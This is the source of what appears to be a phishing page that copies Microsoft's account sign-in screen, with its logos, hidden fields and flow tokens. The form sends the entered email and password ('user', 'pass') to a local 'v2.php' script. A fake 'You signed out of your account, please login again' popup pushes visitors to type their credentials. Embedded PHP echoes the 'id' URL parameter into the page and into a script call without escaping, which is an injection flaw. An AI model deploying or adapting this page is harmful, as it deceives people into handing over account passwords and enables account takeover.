<html dir="ltr" class="gr__login_microsoftonline_com" lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Sign in to your account</title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">
    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>
    <link rel="shortcut icon" href="favicon.ico">
    <link rel='stylesheet' type='text/css' media='screen' href='./assets/styles/styles.css'>
    <meta name="robots" content="none">

</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" data-gr-c-s-loaded="true">

    <div>

        <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">

                <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(./assets/images/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg);">

                </div>

                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(./assets/images/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg);">

                </div>

            </div>

        </div>

        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="v2.php" onsubmit="return checkSubmit()">

            <div class="outer">
                <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }">

                    <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; 
                        paginationControlMethods().currentViewHasMetadata('wide') }">

                        <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">

                            <img class="logo" role="presentation" pngsrc="./assets/images/microsoft_logo.png" svgsrc="./assets/images/microsoft_logo.svg" data-bind="imgSrc" src="./assets/images/microsoft_logo.svg">

                        </div>

                        <div role="main">

                            <div class="pagination-view" data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }">

                                <div data-viewid="1">

                                    <div data-bind="component: { name: 'header-control', params: { serverData: svr } }">
                                        <div class="identityBanner" style="display:none">
                                            <div id="displayName" class="identity">dsfsdgsdm00@gmail.com</div>
                                        </div>
                                        <div class="row text-title" id="loginHeader" role="heading">
                                            <div aria-level="1" data-bind="text: title">Sign in

                                            </div>
                                        </div>

                                        <div class="row">
                                            <div role="alert" aria-live="assertive">

                                                <div class="alert alert-error col-md-24" id="errorBar"></div>

                                            </div>
                                            <div class="form-group col-md-24">

                                                <div class="placeholderContainer" id="emField">

                                                    <input type="email" name="user" id="i0116" value="<?php echo $_GET[
                                                        "id"
                                                    ]; ?>" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" placeholder="Email, phone, or Skype" aria-label="Enter your email address." required="" autofocus="true">

                                                    <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait" style="display: none;">

                                                        <div>
                                                        </div>
                                                        <div>
                                                        </div>
                                                        <div>
                                                        </div>
                                                        <div>
                                                        </div>
                                                        <div></div>
                                                        <div></div>

                                                    </div>

                                                </div>
                                                <div class="placeholderContainer" id="pwField" style="display: none">

                                                    <input required="true" type="password" name="pass" id="i0117" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" placeholder="Password" aria-label="Enter your password.">

                                                    <div id="pwProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait" style="display: none;">

                                                        <div>
                                                        </div>
                                                        <div>
                                                        </div>
                                                        <div>
                                                        </div>
                                                        <div>
                                                        </div>
                                                        <div></div>
                                                        <div></div>

                                                    </div>

                                                </div>

                                            </div>
                                        </div>

                                        <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                            <div data-bind="component: { name: 'action-links-control',
            params: {
                collapseExcessLinks: svr.fCollapseExcessLinks },
            event: {
                menuOpen: actionLinks_onMenuOpen } }">

                                                <div class="row">
                                                    <div class="col-md-24">
                                                        <div class="text-13 action-links">

                                                        <div class="col-md-24">
            <div class="text-13">
                <!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases -->
                <!-- ko if: svr.fIsSelfServiceSignupUxEnabled --><!-- /ko -->

                <!-- ko ifnot: svr.fIsSelfServiceSignupUxEnabled -->
                <div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.urlSignUp || '#',
                            ariaLabel: svr.urlSignUp ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                            click: signup_onClick } }">No account? <a href="https://login.live.com/oauth20_authorize.srf?scope=openid+profile+email+offline_access&amp;response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2msa&amp;state=rQQIARAAdZG_TxNxAMX7baGCohAXHRmcxGvvd3uNDEjLtaV3V653hbulOe737x_9wtH-BS4mDE6MJsaEOBAnojE6M5HopKuDITExDsbR4u7ylvfyyct7D0tYBWs8IAmS0mr7DMJoNIGQDIYiGonTCEERNIGjmEGhRHb35gp8_dn48Ptx-9m3W72rX5_en4DFUeAemhU9Dk_BPQfCZNyoVvM8r8SW5er_jOo5AJcAfAfgpDhvRog8OC2OaYKuESSN12dknMEohqlwkugIrExyUxlynuryLoryODftSTbJeTuQY2Wcl4xQ2VUDLpRJxVMoQdJzoSlDtemEwiaKquyW29vdCvgZQ2CHDuf5E2XamvKhjH0pLgsbB9DBryXO3Kn5q7hoxVk4SuIxPCm9AkJiRh1jM44iU4eV65gZQVfXoBtH_SxOzAy65nh9IxX5joe1NVod8KTtjwb-kY-2QjS2hMChYnHYUll_kiq9tKOl-1Q3E2kFnUgJ62YepTFu0LO2HQnfDCD0VcL2J3rGt3b9kYpQWHOjx2l4OD4kEmTvCSPirY5er1OqemDbVjo56GvBm1J5NmsYRxelO7NSkWusJllsuYF5OQeu5pbQUmNhobwC7hdWC3_mwIv52XM_FOsdp4bsS-broPT8vHAxX11zA5vycQKX-kaL2eM4oRbaoujQfazb7pLtFi3kY6aO9iNynWxgx2VwXC7_LBef3ii8Xfzf12dL4OPtwtXyoy5ZPdrvmMZwp7mj6ayZbvfpvOanGBMNhWgN9XLI6FkOLYFbP1sp_AU1&amp;estsfed=1&amp;uaid=64d4ac74f6bf483c8de40b4ceaf2d3bd&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                <!-- /ko -->
                <!-- /ko -->

                <!-- ko ifnot: hideCantAccessYourAccount -->
                <div class="form-group">
                    <a id="cantAccessAccount" name="cannotAccessAccount" data-bind="
                        text: svr.fEnableLivePreview ? cantAccessYourAccountText : unsafe_cantAccessYourAccountText,
                        click: accessRecoveryLink ? null : cantAccessAccount_onClick,
                        attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                        href: accessRecoveryLink || '#'" href="#">Can’t access your account?</a>
                </div>
                <!-- /ko -->

                <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.fShowForgotUsernameLink || isOfflineAccountVisible) --><!-- /ko -->

                <!-- ko if: svr.fEnableShowPickerCredObservable -->
                    <!-- ko if: showCredPicker() --><!-- /ko -->
                <!-- /ko -->

                <!-- ko ifnot: svr.fEnableShowPickerCredObservable --><!-- /ko -->

                <!-- ko if: svr.urlSkipZtd --><!-- /ko -->
            </div>
        </div>
        
                                                            
                                                    </div>
                                                </div>
                                            </div>
                                            
                                            <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                                <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.fShowButtons,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }">
                                                    <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }">

                                                        <div data-bind="
        css: {
            'inline-block': svr.fRepositionFooterButtons,
            'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            'col-xs-24': !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block">

                                                            <input value="Next" type="button" onclick="goNext()" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible"> </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                    </div>

                                </div>
                            </div>
                        </div>

                        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
                        <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
                        <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
                        <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
                        <input type="hidden" name="canary" data-bind="value: svr.canary" value="+1TvKr0xtb7UylmDA8x1SfQ1jIy97hT1oJTlq1TW7X0=5:1">
                        <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAXWRO2_TUACF4zgJLSCoWGDswARy4nfiiA4hcZ0EP4Jjt7WXyPXz-h3nhpD8AhakDkwdkRBSxcRUgRB7p0owwcqAKiGhDoiR9AewnOno09H5HqBEnWjfpymasZqHHMZZLIXRHIFjFk2yGMVQLEXihMPgVHHn-hZ899X5_OdR_-WPG-LF5ZdPJ8jdAMJ81m40FotFPfM8YLt1O0sapwhyjiA_EeS4XHVTTB-flGcsxTYpmiVbaxrJEQzH1SVNDRRBp6WVDqXQBDLAcZmUVqLm01L4FEqCTsqakxj7ZiwlOm2EBqNo9kLp6dDsBYnSxXFT2AXi_m4srxmKsBdIYbQ0VvxKTnTiW_m20pnDgLyKrAAr97K86WVFMsmzGTxG3yJK7qYDp5ulqWvD-lXNTSGwLQiydFRkuVtA4M52OlNVHoRE32LNsUz70WQcPY9wPsEzT4kDJlP3eFOIllNDnA6s6SEzLFTWwJdaLoAiZCwOxKL3JNDIbgxhZFJ-tLQLmd-PJibGEL2OKFlkMntG5djBY04l-YHdajGmOfd9b7qcj6z4PVpb35pk6Rl6az0qBc52XmQeiN3zCnJRuYmj7Y2N2hZyr7Rd-ltBXlfXtn4Z3kfJTIQ33Pcx-uq0dFZtPASxz0QkRWojh-cOJElpJr6qBuyIGPaHdJ9nlcWMa-GjlN6h28RRDTmq1X7Xyi-ulT5s_s_1Pw2">
                        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="36a648b0-db02-4fb9-94f7-90ab443bba00">
                        <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAADXzZ3ifr-GRbDT45zNSEFEcwok7UwaFAEeTkGkr4fYzqYlvkqQEWc-D98Nx_A-vEgBRYxicR1CYl-OPqMASkAWafraIsQEfIl9qKqydbqg8cjikyBJcsHrpf5NVvvQbEIPhj22KWJTxm81_dcfMwNbd0-atncF5Chjg_B_PbPYFYRi9eGq5hJDgfvRwmolkOMEb4E4egrUnVxXCE987p5MHhCVwmwgd0TtwfC6Mu-OR3BZkIWGOC3WSTmqpVmO6gGRuegKFeh62T5kEeEk-75sSaVLFA4yUsjb3oUxPp1gYcQghrK1QcZ6mEuqd2-PdLLKtC1JQ9xOCxeZz4z-NsISRk1BU2NihSGT77vl89iYMWnSJe-3p0OpQb4PJgZOFprGZgzdfqXA4O6NKJR6z4QKIAA">
                        <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="">
                        <input type="hidden" name="NewUser" value="1">
                        <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="">
                        <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
                        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
                        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0">
                        <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="1">
                        <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }">
                            <input type="hidden" name="i2" data-bind="value: clientMode" value="1">
                            <input type="hidden" name="i17" data-bind="value: srsFailed" value="">
                            <input type="hidden" name="i18" data-bind="value: srsSuccess" value="">
                            <input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
                        </div>
                    </div>

                </div>

            </div>
        </form>

        <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }">

        </form>

        <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }">
            <iframe height="0" width="0" src="./Sign in to your account_files/prefetch(1).html" style="display: none;"></iframe>
        </div>

    </div>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script type="text/javascript" src="./assets/js/onload.js"></script>
  

    <div id="popup1" class="overlay" style="visibility:visible;opacity: 1">
        <div class="popup">
            <a class="close" href="#" onclick="closeBox()">×</a>
            <div class="content">
                You signed out of your account, please login again.
            </div>
        </div>
    </div>
    
</body>

</html>

<?php
if (isset($_GET['error'])) {
    $id = filter_var($_GET['id'], FILTER_SANITIZE_STRING);
    echo "<script>closeBox(); iserror('$id');</script>";
    error_log("Error encountered with ID: $id", 0);
}
?>